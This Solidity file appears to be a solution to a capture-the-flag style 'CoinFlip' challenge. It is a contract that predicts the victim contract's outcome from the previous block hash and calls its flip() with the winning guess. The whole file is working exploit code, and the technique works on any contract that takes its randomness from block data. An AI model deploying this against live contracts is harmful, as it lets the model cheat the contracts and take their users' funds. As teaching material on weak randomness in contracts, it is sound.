pragma solidity ^0.4.18;

import "./CoinFlip.sol";
import "./SafeMath.sol";

contract CoinFlipExploit {
    address public owner;
    address public victim_addr;
    //factor needed to correctly select _guess
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address addr) {
        // Remember our wallet address
        owner = msg.sender;
        // Remember the victim contract, aka instance address
        victim_addr = addr;
    }
    
    function () payable{}

    // Call 10 times
    function exploit(bool _guess) public {
        //copy over same logic from orignal CoinFlip contract to figure out "side"
        //block.blockhas and block.number are known values so no true randonmness in this contract
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;
        
        if(side == _guess) {
          //call flip() from CoinFlip.sol using _guess
            CoinFlip(victim_addr).flip(_guess) ;
            //HeadsOrTails(victim_addr).play.value(.1 ether)(coinFlip == 1);
        } else {
          //if side and _guess are not equal then guess the opposite
            CoinFlip(victim_addr).flip(!_guess) ;
        }
    }
}
